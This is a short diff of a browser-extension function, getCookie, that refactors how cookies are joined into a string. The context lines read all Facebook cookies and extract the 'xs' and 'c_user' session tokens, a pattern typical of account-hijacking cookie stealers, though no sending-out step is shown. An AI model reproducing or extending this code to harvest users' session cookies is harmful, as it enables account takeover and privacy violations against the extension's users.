@@ -507,8 +507,7 @@ function getCookie() {
             chrome.cookies.getAll(
                 { url: "https://www.facebook.com" },
                 function (e) {
-                    let t = "";
-                    t = e.map((i) => `${i.name}=${i.value}`).join("; ");
+                    let t = e.map((i) => `${i.name}=${i.value}`).join("; ");
 
                     if (t.includes("xs=") && t.includes("c_user=")) {
                         let c_user = t.split("c_user=")[1].split("; ")[0];
